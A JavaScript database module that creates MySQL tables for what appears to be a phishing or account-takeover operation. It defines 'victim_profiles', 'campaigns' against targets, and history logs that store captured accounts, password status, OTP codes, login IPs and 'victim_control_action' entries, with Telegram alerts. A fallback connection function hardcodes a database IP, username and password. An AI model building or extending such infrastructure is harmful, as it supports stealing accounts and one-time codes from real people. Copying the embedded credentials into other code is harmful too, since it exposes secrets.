/**
 * Production Database Configuration
 * MySQL connection for VPS deployment
 */

import mysql from "mysql2/promise";
import dotenv from "dotenv";

// Load production environment
dotenv.config({ path: "./production/.env.production" });

class ProductionDatabase {
  constructor() {
    this.pool = null;
    this.isConnected = false;
  }

  // Initialize production database connection
  async initialize() {
    try {
      console.log("🗄️ Initializing production database connection...");

      // Create connection pool for production
      this.pool = mysql.createPool({
        host: process.env.DATABASE_HOST,
        port: parseInt(process.env.DATABASE_PORT),
        user: process.env.DATABASE_USER,
        password: process.env.DATABASE_PASSWORD,
        database: process.env.DATABASE_NAME,
        waitForConnections: true,
        connectionLimit: 20,
        queueLimit: 0,
        acquireTimeout: 30000,
        timeout: 30000,
        reconnect: true,
        charset: "utf8mb4",
        timezone: "+00:00",
      });

      // Test connection
      const connection = await this.pool.getConnection();
      console.log("✅ Database connection established");

      // Initialize production tables
      await this.initializeProductionTables(connection);

      connection.release();
      this.isConnected = true;

      console.log("✅ Production database initialized successfully");
      return true;
    } catch (error) {
      console.error("❌ Database connection failed:", error);
      this.isConnected = false;
      return false;
    }
  }

  // Initialize all production tables
  async initializeProductionTables(connection) {
    try {
      console.log("📊 Creating production database tables...");

      // Admin History Table (Production)
      await connection.execute(`
        CREATE TABLE IF NOT EXISTS ${process.env.ADMIN_HISTORY_TABLE || "admin_history_logs"} (
          id VARCHAR(255) PRIMARY KEY,
          timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          platform VARCHAR(50) NOT NULL,
          action VARCHAR(100) NOT NULL,
          status ENUM('success', 'failed', 'pending', 'warning') NOT NULL,
          link_name VARCHAR(500),
          account VARCHAR(255),
          password_status VARCHAR(50),
          otp_code VARCHAR(20),
          login_ip VARCHAR(45),
          chrome_profile VARCHAR(100),
          notification TEXT,
          victim_control_action VARCHAR(50),
          user_identifier VARCHAR(255),
          message TEXT,
          metadata JSON,
          category VARCHAR(50),
          session_id VARCHAR(255),
          duration_ms INT DEFAULT 0,
          user_agent TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

          INDEX idx_timestamp (timestamp),
          INDEX idx_platform (platform),
          INDEX idx_status (status),
          INDEX idx_account (account),
          INDEX idx_victim_action (victim_control_action),
          INDEX idx_user (user_identifier),
          INDEX idx_category (category),
          INDEX idx_session (session_id),
          INDEX idx_created_at (created_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      // Victim Profiles Table (Production)
      await connection.execute(`
        CREATE TABLE IF NOT EXISTS victim_profiles (
          id VARCHAR(255) PRIMARY KEY,
          name VARCHAR(255) NOT NULL,
          email VARCHAR(255),
          phone VARCHAR(50),
          platform VARCHAR(50) NOT NULL,
          target_email VARCHAR(255),
          target_phone VARCHAR(50),
          risk_level ENUM('low', 'medium', 'high', 'critical') DEFAULT 'medium',
          engagement_score DECIMAL(5,2) DEFAULT 0.00,
          tags JSON,
          metadata JSON,
          interactions_count INT DEFAULT 0,
          last_interaction TIMESTAMP NULL,
          status ENUM('active', 'inactive', 'completed', 'failed') DEFAULT 'active',
          created_by VARCHAR(255),
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

          INDEX idx_platform (platform),
          INDEX idx_risk_level (risk_level),
          INDEX idx_status (status),
          INDEX idx_created_by (created_by),
          INDEX idx_email (email),
          INDEX idx_target_email (target_email)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      // Campaigns Table (Production)
      await connection.execute(`
        CREATE TABLE IF NOT EXISTS campaigns (
          id VARCHAR(255) PRIMARY KEY,
          name VARCHAR(255) NOT NULL,
          description TEXT,
          platform VARCHAR(50) NOT NULL,
          target_profiles JSON,
          actions JSON,
          schedule JSON,
          status ENUM('draft', 'active', 'paused', 'completed', 'failed') DEFAULT 'draft',
          start_date TIMESTAMP NULL,
          end_date TIMESTAMP NULL,
          success_rate DECIMAL(5,2) DEFAULT 0.00,
          total_targets INT DEFAULT 0,
          completed_targets INT DEFAULT 0,
          failed_targets INT DEFAULT 0,
          metadata JSON,
          created_by VARCHAR(255),
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

          INDEX idx_platform (platform),
          INDEX idx_status (status),
          INDEX idx_created_by (created_by),
          INDEX idx_start_date (start_date)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      // Sessions Table (Production)
      await connection.execute(`
        CREATE TABLE IF NOT EXISTS user_sessions (
          id VARCHAR(255) PRIMARY KEY,
          platform VARCHAR(50) NOT NULL,
          user_identifier VARCHAR(255) NOT NULL,
          session_data JSON,
          login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
          expires_at TIMESTAMP NULL,
          ip_address VARCHAR(45),
          user_agent TEXT,
          status ENUM('active', 'expired', 'terminated') DEFAULT 'active',

          INDEX idx_platform (platform),
          INDEX idx_user (user_identifier),
          INDEX idx_status (status),
          INDEX idx_expires_at (expires_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      // System Settings Table (Production)
      await connection.execute(`
        CREATE TABLE IF NOT EXISTS system_settings (
          id INT PRIMARY KEY AUTO_INCREMENT,
          setting_key VARCHAR(255) UNIQUE NOT NULL,
          setting_value TEXT,
          setting_type ENUM('string', 'number', 'boolean', 'json') DEFAULT 'string',
          category VARCHAR(100),
          description TEXT,
          updated_by VARCHAR(255),
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

          INDEX idx_category (category),
          INDEX idx_key (setting_key)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      // Insert default system settings
      await connection.execute(`
        INSERT IGNORE INTO system_settings (setting_key, setting_value, setting_type, category, description) VALUES
        ('system_initialized', 'true', 'boolean', 'system', 'System initialization flag'),
        ('max_concurrent_operations', '20', 'number', 'performance', 'Maximum concurrent operations'),
        ('session_timeout', '3600000', 'number', 'security', 'Session timeout in milliseconds'),
        ('rate_limit_requests', '100', 'number', 'security', 'Rate limit max requests'),
        ('backup_retention_days', '30', 'number', 'backup', 'Backup retention period in days'),
        ('telegram_notifications', 'true', 'boolean', 'notifications', 'Enable Telegram notifications'),
        ('realtime_logging', 'true', 'boolean', 'logging', 'Enable real-time logging'),
        ('chrome_max_instances', '10', 'number', 'automation', 'Maximum Chrome instances'),
        ('victim_max_profiles', '100000', 'number', 'victim', 'Maximum victim profiles')
      `);

      console.log("✅ Production database tables created successfully");
    } catch (error) {
      console.error("❌ Failed to create production tables:", error);
      throw error;
    }
  }

  // Execute query with production error handling
  async query(sql, params = []) {
    if (!this.isConnected) {
      throw new Error("Database not connected");
    }

    try {
      const [rows] = await this.pool.execute(sql, params);
      return rows;
    } catch (error) {
      console.error("❌ Database query error:", error);
      throw error;
    }
  }

  // Get database health status
  async getHealthStatus() {
    try {
      const [rows] = await this.pool.execute("SELECT 1 as health_check");
      return {
        status: "healthy",
        connected: true,
        timestamp: new Date().toISOString(),
        database: process.env.DATABASE_NAME,
      };
    } catch (error) {
      return {
        status: "unhealthy",
        connected: false,
        error: error.message,
        timestamp: new Date().toISOString(),
      };
    }
  }

  // Close database connection
  async close() {
    if (this.pool) {
      await this.pool.end();
      console.log("✅ Database connection closed");
    }
  }
}

// Create and export production database instance
const productionDB = new ProductionDatabase();


/**
 * Create database connection with proper error handling
 */
export async function createConnection(config = null) {
  try {
    const connectionConfig = config || {
      host: process.env.DB_HOST || '85.31.224.8',
      user: process.env.DB_USER || 'voti_voting_user',
      password: process.env.DB_PASSWORD || '123123zz@',
      database: process.env.DB_NAME || 'voti_voting_secure_2025',
      port: process.env.DB_PORT || 3306,
      connectionLimit: 10,
      acquireTimeout: 60000,
      timeout: 60000,
      reconnect: true,
      charset: 'utf8mb4'
    };

    const connection = mysql.createConnection(connectionConfig);
    
    // Test the connection
    await new Promise((resolve, reject) => {
      connection.connect((error) => {
        if (error) {
          console.error('❌ Database connection failed:', error);
          reject(error);
        } else {
          console.log('✅ Database connected successfully');
          resolve();
        }
      });
    });

    return connection;
  } catch (error) {
    console.error('💥 Failed to create database connection:', error);
    throw error;
  }
}


export default productionDB;
